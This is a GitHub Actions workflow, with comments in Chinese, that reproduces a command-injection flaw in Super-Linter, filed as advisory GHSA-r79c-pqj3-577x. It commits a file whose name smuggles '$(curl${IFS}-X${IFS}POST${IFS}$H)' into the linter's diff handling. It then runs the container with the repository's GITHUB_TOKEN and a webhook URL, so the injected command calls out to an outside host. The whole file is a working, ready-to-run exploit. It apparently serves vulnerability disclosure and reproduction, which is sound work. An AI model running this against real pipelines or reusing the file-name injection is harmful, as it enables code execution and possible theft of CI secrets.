name: Security Repro - GHSA-r79c-pqj3-577x

on:
  workflow_dispatch:
    inputs:
      target_version:
        description: 'Target version'
        required: true
        default: 'v7'
      webhook_url:
        description: 'Webhook URL'
        required: true
        default: 'https://webhook.site/YOUR-UUID-HERE'

jobs:
  repro-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: 1. Setup Git & Payload
        run: |
          rm -rf .git
          git init
          git config --global user.email "attacker@example.com"
          git config --global user.name "Attacker"
          
          # 1. 创建基准分支 (master)
          echo "safe" > README.md
          git add README.md
          git commit -m "init"
          git branch -m master
          
          # 【关键】保存基准 Commit 的 SHA
          echo "MASTER_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV
          
          # 2. 构造 Payload (使用环境变量法，无斜杠，无空格)
          # 文件名: pre$(curl${IFS}-X${IFS}POST${IFS}$H).md
          # 我们用 ${IFS} 替代空格，防止 parallel 或 shell 在参数分割时出问题
          # $H 是后面传入的 Webhook URL
          PAYLOAD_NAME='pre$(curl${IFS}-X${IFS}POST${IFS}$H).md'
          
          echo "Creating malicious file: $PAYLOAD_NAME"
          touch "$PAYLOAD_NAME"
          
          # 3. 提交
          git add "$PAYLOAD_NAME"
          git commit -m "add exploit"
          
          # 【关键】保存当前 Commit 的 SHA
          echo "CURRENT_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV

      - name: 2. Run Super-Linter (Force Diff)
        continue-on-error: true
        run: |
          echo "Testing version: ${{ inputs.target_version }}"
          echo "Diff Range: ${{ env.MASTER_SHA }} ... ${{ env.CURRENT_SHA }}"
          
          # 环境变量法：把 URL 传给 H
          # 显式指定 BEFORE_SHA，强迫它算出 Diff
          
          docker run --rm \
            -e RUN_LOCAL=true \
            -e VALIDATE_ALL_CODEBASE=false \
            -e DEFAULT_BRANCH=master \
            -e GITHUB_BEFORE_SHA=${{ env.MASTER_SHA }} \
            -e GITHUB_SHA=${{ env.CURRENT_SHA }} \
            -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
            -e H="${{ inputs.webhook_url }}" \
            -v "$(pwd):/tmp/lint" \
            ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
            
      - name: 3. Verify
        run: |
          echo "Please check ${{ inputs.webhook_url }}"
